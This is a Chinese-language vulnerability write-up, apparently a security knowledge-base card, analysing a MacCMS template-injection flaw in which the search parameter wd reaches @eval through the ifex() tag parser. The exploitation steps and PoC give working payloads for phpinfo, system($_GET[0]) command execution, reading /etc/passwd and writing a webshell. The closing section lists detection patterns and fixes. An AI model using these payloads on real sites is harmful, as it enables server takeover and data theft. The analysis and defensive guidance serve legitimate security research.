---
id: web-generic-ssti-maccms-ifex-template-tag-eval-injection
title: 苹果CMS (MacCMS) 前台搜索 wd 注入 {if-...} 模板标签：经 str_replace 进入 $tpl->H，ifex() 正则提取条件后 @eval 执行
type: scenario
domain: web
path: web/generic/ssti
technique: maccms-ifex-template-tag-eval-injection
aliases:
- MacCMS 模板注入
- 苹果CMS RCE
- ifex 代码执行
- asp2phpif 绕过
- '{if-x:phpinfo()} 注入'
- 自研模板引擎 eval 注入
tags:
- web
- php
- ssti
- maccms
- template-injection
- eval
- rce
- cms
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V361
  verified_at: '2026-11-09T02:38:54+08:00'
  notes: 已对照原文全文与5张图核对：01.png 为 ifex() 在 index.php 及 admin/make.php 的调用点搜索；02.png 为 Burp 请求 index.php?m=vod-search&wd={if-x:phpinfo()}{endif-x} 成功返回 PHP 5.3.29 phpinfo，实锤代码执行；03-05 为 TInjA/Tplmap/SSTImap 仓库页。卡内 index.php→vod.php search→chkSql/htmlEncode→str_replace 进 $tpl->H→ifex() 正则→asp2phpif→@eval 全链与原文代码一致，且明确 htmlEncode 不拦 {}()$[]、无引号 $GET 绕过引号转义的原理正确。原文未标注 MacCMS 受影响版本，affected_versions 留空正确。跳过判断成立：引擎语法/载荷清单与检测工具介绍属背景/工具说明，现有 Twig/Smarty/引擎识别卡已覆盖（引用卡均存在），无漏抽。dedup top 候选（MacCMS 后台模板遍历、SeaCMS/PbootCMS/DeDeCMS/ZzzCMS/FoxCMS 模板标签 RCE）均为不同产品/入口，dedup_review 成立。dup-scan.json（2026-11-08 19:10）早于建卡（2026-11-09 01:53），无涉及本卡 pair。未验证点：未在本机复现 MacCMS；卡内 system($_GET[0]) 延伸用法未实跑（phpinfo 主链已由原文图02证实）；frontmatter 无 sources/source_url（全库惯例）。
---

## 一句话结论

苹果CMS（MacCMS）自研模板引擎把模板中的 `{if-标志:条件}...{endif-标志}` 标签用正则解析后，经只做字符串替换的 `asp2phpif()` 处理，直接 `@eval("if($strif){...}")` 求值条件表达式；前台搜索参数 `wd` 会被 `str_replace` 拼进模板内容 `$tpl->H`，而 `chkSql()`/`htmlEncode()` 只做 HTML 实体化、不拦 `{ } ( ) $ [ ]`，因此请求 `index.php?m=vod-search&wd={if-x:phpinfo()}{endif-x}` 即可执行任意 PHP 代码。

## 原理

- **入口链路**：`index.php` 用 `be('get','m')` 取 `m`，`m=vod-search` 进入 `inc/module/vod.php` 的 search 分支：`$wd = trim(be("all","wd")); $wd = chkSql($wd); $tpl->P["wd"] = $wd;`；随后 `$tpl->H = loadFile(".../vod_search.html")` 并把 `{page:wd}` 等占位符 `str_replace` 成 `$tpl->P["wd"]`——用户输入由此进入模板文本。最后 `index.php` 调用 `$tpl->ifex()` 处理模板里的 `{if-...}` 标签。
- **弱过滤**：`chkSql()` 实际只调用 `htmlEncode()`，替换 `& > < ' 空格 " \t \r \n` 为 HTML 实体；`{`、`}`、`(`、`)`、`$`、`[`、`]`、`,`、`:` 全部原样保留，因此模板标签语法可以完整注入。
- **标签解析**：`ifex()` 先用 `strpos` 判断模板是否含 `{if-`，再用正则 `{if-([\s\S]*?):([\s\S]+?)}([\s\S]*?){endif-\1}` 提取标志、条件与 then 体，对条件调用 `asp2phpif()`。
- **无效净化**：`asp2phpif()` 只是把 `not→!`、`==→=`（随后 `=→==`）、`<>→!=`、`and→&&`、`or→||`、`mod→%` 做字符串替换，属于“把 ASP 语法转 PHP 语法”的适配函数，并不限制表达式内容，任意 PHP 表达式都能通过。
- **危险 sink**：条件最终进入 `@eval("if($strif){\$ifFlag=true;}else{\$ifFlag=false;}")`，`@` 只是抑制报错；`$strif` 为 `phpinfo()` 时即执行 `if(phpinfo()){...}`。
- **为什么无需引号也能打通**：`htmlEncode` 会转义单/双引号，但 PHP 的很多危险调用可以不用引号：`phpinfo()`、`system($_GET[0])`、`file_get_contents($_GET[1])` 等，参数用超全局数组从额外 GET 参数取原始值，绕过 `wd` 的 HTML 编码限制。
- **根因**：模板“条件”被当作可信模板语法设计，却在运行时用 `eval` 动态求值；一旦模板文本可由用户输入拼接，sanitizer 只做 HTML 实体化完全阻止不了 PHP 语法注入。

## 触发条件

- 目标为使用 `ifex()`/`asp2phpif()` 这套自研模板引擎的 MacCMS 版本（原文未标注具体版本），且前台搜索等入口可访问。
- 存在“用户参数被 `str_replace` 拼进 `$tpl->H` 后再调用 `ifex()`”的调用链（搜索 `wd` 是典型入口）。
- 输入过滤仅为 `htmlEncode` 类 HTML 实体化，不拦截 `{ } ( ) $ [ ]` 等模板/PHP 语法字符。
- 模板引擎使用 `eval` 求值条件（PHP 的 `eval` 是语言结构，`disable_functions` 无法禁用，需 Suhosin 等扩展限制）。

## 利用步骤

1. 探测：请求 `index.php?m=vod-search&wd={if-x:phpinfo()}{endif-x}`，观察响应是否出现 phpinfo 页面。
2. 命令执行：把条件换成无引号超全局表达式，另带参数提供值：
   `index.php?m=vod-search&wd={if-x:system($_GET[0])}{endif-x}&0=id`
3. 读取文件：`wd={if-x:readfile($_GET[0])}{endif-x}&0=/etc/passwd`（或 Windows 路径）。
4. 写文件（环境相关）：`wd={if-x:file_put_contents($_GET[1],$_GET[2])}{endif-x}&1=shell.php&2=...`——注意额外参数经 `$_GET` 直取，可能受 PHP magic quotes 影响，内容中带引号时需自行编码/转义。
5. 若不需要回显，可先用 phpinfo/`sleep` 类表达式确认执行，再选择外带方式。

## PoC

```http
GET /maccms/index.php?m=vod-search&wd={if-x:phpinfo()}{endif-x} HTTP/1.1
Host: target
```

```bash
# 命令执行：system($_GET[0]) 不需要引号，可绕过 htmlEncode 的引号转义
curl -s 'http://target/maccms/index.php?m=vod-search&wd=%7Bif-x%3Asystem(%24_GET%5B0%5D)%7D%7Bendif-x%7D&0=id'
```

注解：`{if-x:phpinfo()}{endif-x}` 中 `x` 是任意标志（正则反向引用 `\1` 要求 `{endif-` 后同名）；条件体 `phpinfo()` 经 `asp2phpif` 原样进入 `eval`。

## 变体与关联

- **同类模板语法注入**：Twig 的 `filter/map/reduce` 回调 RCE 见 [[web-generic-ssti-twig-filter-map-reduce-callback-rce]]；Smarty 的 `{system()}`/WriteFile 见 [[web-generic-ssti-smarty-direct-rce-v4-v5-bypass]]；引擎识别见 [[web-generic-ssti-engine-identification-decision-tree-errors]]。
- **同 CMS 其他漏洞**：MacCMS 后台模板文件读取见 [[web-generic-file-inclusion-maccms-backend-template-adsinfo-file-traversal-read]]。
- **变体**：其他自研模板引擎若把条件/表达式 `eval` 求值（或 `assert`、`create_function`）且模板文本可被用户输入拼接，可套用同一思路；绕过点在于找到“用户输入进入模板文本”的参数（搜索词、留言、自定义字段）。
- **边界**：目标版本已修复/重写 ifex 或对 `{` `}` 做实体化、模板缓存使注入内容不进入本次渲染、WAF 拦截 `{if-` 时失效。

## 检测与防御

- **请求特征**：参数中出现 `{if-`、`{endif-`、`{else-` 等模板标签；搜索词中包含 `phpinfo(`、`system(`、`passthru(`、`$_GET`、`file_put_contents` 等 PHP 代码片段；同一来源短时间内探测多种表达式。
- **代码审计**：全局搜索模板引擎中的 `eval(`/`assert(`/`create_function(`，确认其参数是否可能来自用户拼接的模板文本；检查 `chkSql`/`htmlEncode` 这类“只做 HTML 实体化”的过滤是否被误当作代码注入防护。
- **修复**：模板条件改为受限表达式解析（只允许变量、比较与逻辑运算符的白名单），禁止 `eval` 求值用户可控内容；`wd` 等参数进入模板前做 `{`/`}` 转义或改用变量绑定而非文本替换；升级到修复版本。
- **加固**：WAF 对 `{if-`/`{endif-` 与 PHP 函数名组合告警；关闭模板编译缓存目录的写权限（防结合写马）；限制 PHP 进程权限并监控异常子进程。
